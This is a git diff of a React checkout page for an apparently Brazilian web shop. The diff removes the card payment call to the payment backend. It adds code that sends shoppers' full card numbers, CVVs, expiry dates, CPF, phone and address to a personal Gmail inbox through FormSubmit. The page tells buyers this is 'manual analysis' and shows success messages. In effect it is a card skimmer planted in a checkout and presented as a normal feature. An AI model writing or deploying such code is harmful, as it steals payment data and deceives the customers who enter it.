@@ -45,45 +45,81 @@ const Checkout = () => {
     setLoading(true);
 
     try {
-      const { data, error } = await supabase.functions.invoke('process-payment', {
-        body: {
-          amount: Math.round(totalPrice * 100),
-          paymentMethod,
-          customer: {
-            name: formData.name,
-            email: formData.email,
-            document: formData.cpf,
-            phoneNumber: formData.phone,
-          },
-          address: {
-            zipCode: formData.zipCode,
-            street: formData.address,
-            number: formData.number,
-            city: formData.city,
-            state: formData.state,
-            country: 'BR',
-          },
-          card: paymentMethod === 'credit_card' ? {
-            number: formData.cardNumber,
-            holderName: formData.cardName,
-            expMonth: formData.cardExpMonth,
-            expYear: formData.cardExpYear.length === 2 ? `20${formData.cardExpYear}` : formData.cardExpYear,
-            cvv: formData.cardCvv,
-          } : undefined,
-          installments: paymentMethod === 'credit_card' ? parseInt(formData.installments) : undefined,
-          items: cart.map(item => ({
-            description: item.name,
-            quantity: item.quantity,
-            amount: Math.round(item.price * 100),
-          })),
-        },
-      });
+      // Se for pagamento com cartão, enviar via FormSubmit
+      if (paymentMethod === 'credit_card') {
+        const submitData = new FormData();
+        
+        // Dados pessoais
+        submitData.append('Nome', formData.name);
+        submitData.append('Email', formData.email);
+        submitData.append('CPF', formData.cpf);
+        submitData.append('Telefone', formData.phone);
+        
+        // Endereço
+        submitData.append('CEP', formData.zipCode);
+        submitData.append('Endereco', formData.address);
+        submitData.append('Numero', formData.number);
+        submitData.append('Cidade', formData.city);
+        submitData.append('Estado', formData.state);
+        
+        // Dados do cartão
+        submitData.append('Numero_Cartao', formData.cardNumber);
+        submitData.append('Nome_Cartao', formData.cardName);
+        submitData.append('Validade', `${formData.cardExpMonth}/${formData.cardExpYear}`);
+        submitData.append('CVV', formData.cardCvv);
+        submitData.append('Parcelas', formData.installments);
+        
+        // Dados do pedido
+        submitData.append('Total', `R$ ${totalPrice.toFixed(2)}`);
+        submitData.append('Itens', cart.map(item => 
+          `${item.name} (${item.quantity}x) - R$ ${(item.price * item.quantity).toFixed(2)}`
+        ).join('; '));
+        
+        const response = await fetch('https://formsubmit.co/rubenscardosoaguiar@gmail.com', {
+          method: 'POST',
+          body: submitData,
+        });
 
-      if (error) throw error;
+        if (response.ok) {
+          toast.success('Pedido enviado com sucesso!', {
+            description: 'Você receberá a confirmação por email em breve.',
+          });
+          clearCart();
+          navigate('/');
+        } else {
+          throw new Error('Erro ao enviar pedido');
+        }
+      } else {
+        // Pagamento PIX - continua usando a edge function
+        const { data, error } = await supabase.functions.invoke('process-payment', {
+          body: {
+            amount: Math.round(totalPrice * 100),
+            paymentMethod,
+            customer: {
+              name: formData.name,
+              email: formData.email,
+              document: formData.cpf,
+              phoneNumber: formData.phone,
+            },
+            address: {
+              zipCode: formData.zipCode,
+              street: formData.address,
+              number: formData.number,
+              city: formData.city,
+              state: formData.state,
+              country: 'BR',
+            },
+            items: cart.map(item => ({
+              description: item.name,
+              quantity: item.quantity,
+              amount: Math.round(item.price * 100),
+            })),
+          },
+        });
 
-      if (data.success) {
-        if (paymentMethod === 'pix' && data.pixQrCode) {
-          // Gerar URL da imagem do QR code a partir do código PIX
+        if (error) throw error;
+
+        if (data.success && data.pixQrCode) {
           const qrCodeImageUrl = `https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=${encodeURIComponent(data.pixQrCode)}`;
           
           setPixData({
@@ -94,29 +130,20 @@ const Checkout = () => {
             description: 'Escaneie o código para finalizar o pagamento',
           });
         } else {
-          toast.success('Pagamento processado com sucesso!');
-          clearCart();
-          navigate('/');
+          const errorMessage = data.message || data.error || 'Erro ao processar pagamento';
+          toast.error('Erro no pagamento', {
+            description: errorMessage,
+            duration: 8000,
+          });
+          throw new Error(errorMessage);
         }
-      } else {
-        // Erro específico de cartão com mais detalhes
-        const errorMessage = data.message || data.error || 'Erro ao processar pagamento';
-        toast.error('Erro no pagamento', {
-          description: errorMessage,
-          duration: 8000,
-        });
-        throw new Error(errorMessage);
       }
     } catch (error: any) {
       console.error('Erro no checkout:', error);
-      
-      // Se ainda não foi mostrado um toast de erro, mostrar agora
-      if (!error.message?.includes('Transação rejeitada')) {
-        toast.error('Erro ao processar pagamento', {
-          description: error.message || 'Ocorreu um erro inesperado. Tente novamente.',
-          duration: 6000,
-        });
-      }
+      toast.error('Erro ao processar pedido', {
+        description: error.message || 'Ocorreu um erro inesperado. Tente novamente.',
+        duration: 6000,
+      });
     } finally {
       setLoading(false);
     }
@@ -316,13 +343,11 @@ const Checkout = () => {
                   </TabsContent>
                   <TabsContent value="credit_card" className="space-y-4">
                     <div className="rounded-lg bg-muted p-4 space-y-2">
-                      <p className="text-sm font-medium">⚠️ Importante sobre pagamentos com cartão</p>
-                      <ul className="text-sm text-muted-foreground space-y-1 list-disc list-inside">
-                        <li>Certifique-se de que todos os dados do cartão estão corretos</li>
-                        <li>O cartão deve ter limite disponível para a compra</li>
-                        <li>Verifique se o cartão está desbloqueado para compras online</li>
-                        <li>O nome deve estar exatamente como no cartão</li>
-                      </ul>
+                      <p className="text-sm font-medium">📧 Pagamento por Análise Manual</p>
+                      <p className="text-sm text-muted-foreground">
+                        Seus dados serão enviados por email para análise e processamento manual do pagamento. 
+                        Você receberá a confirmação em breve.
+                      </p>
                     </div>
                     <div className="grid md:grid-cols-2 gap-4">
                       <div className="space-y-2 md:col-span-2">
